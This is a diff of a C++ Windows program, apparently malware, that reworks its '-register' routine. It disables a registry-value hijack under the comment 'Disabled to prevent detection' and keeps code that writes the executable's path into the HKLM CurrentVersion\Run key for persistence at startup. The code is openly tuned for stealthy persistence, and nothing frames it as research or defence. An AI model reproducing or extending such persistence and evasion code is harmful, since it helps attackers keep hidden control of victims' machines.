@@ -306,6 +306,10 @@ public:
 
 			if (std::string::npos != cmdLine.find("-register"))
 			{
+				std::string moduleName = "\"" + GetProcessFileName(GetCurrentProcessId()) + "\"";
+
+				// Disabled to prevent detection
+				/*
 				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, NULL, &ucbValue))
 				{
 					std::string strValue;
@@ -315,16 +319,14 @@ public:
 					{
 						ULONG ucbOrgValue = 0;
 
-						//RegSetValueExA(hkey, NULL /*Default*/, NULL,  /*dataType*/REG_SZ, (LPBYTE)"\"%1\" %*", ucbValue);
-
-						std::string moduleName = "\"" + GetProcessFileName(GetCurrentProcessId()) + "\"";
+						//RegSetValueExA(hkey, NULL, NULL,  REG_SZ, (LPBYTE)"\"%1\" %*", ucbValue);
 
 						// Re-entrancy check
 						DWORD dataTypeTmp = REG_NONE;
 						if (ERROR_SUCCESS != RegQueryValueExA(hkey, cOrgValueName, NULL, &dataTypeTmp, NULL, &ucbOrgValue))
 						{
 							// 0. Set Original Value
-							RegSetValueExA(hkey, cOrgValueName, NULL, /*dataType*/REG_SZ, (LPBYTE)strValue.c_str(), strValue.length() * sizeof(CHAR));
+							RegSetValueExA(hkey, cOrgValueName, NULL, REG_SZ, (LPBYTE)strValue.c_str(), strValue.length() * sizeof(CHAR));
 
 							// 2. Add into front of the value
 							strValue = moduleName + " " + strValue;
@@ -332,19 +334,21 @@ public:
 							// 3. Set Value
 							LPBYTE lpbyte = (LPBYTE)strValue.c_str();
 							ucbValue = (strValue.length()) * sizeof(CHAR);
-							RegSetValueExA(hkey, cDefaultValueName, NULL,  /*dataType*/REG_SZ, lpbyte, ucbValue);
-						}
-
-						HKEY hkeyRun = NULL;
-						if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hkeyRun))
-						{
-							RegSetValueExA(hkeyRun, cRunValueName, NULL, REG_SZ, (LPBYTE)moduleName.c_str(), moduleName.length() * sizeof(CHAR));
-
-							RegCloseKey(hkeyRun);
-							hkeyRun = NULL;
+							RegSetValueExA(hkey, cDefaultValueName, NULL,  REG_SZ, lpbyte, ucbValue);
 						}
 					}
 				}
+		*/
+
+				HKEY hkeyRun = NULL;
+				if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hkeyRun))
+				{
+					RegSetValueExA(hkeyRun, cRunValueName, NULL, REG_SZ, (LPBYTE)moduleName.c_str(), moduleName.length() * sizeof(CHAR));
+
+					RegCloseKey(hkeyRun);
+					hkeyRun = NULL;
+				}
+
 
 				return true;
 			}
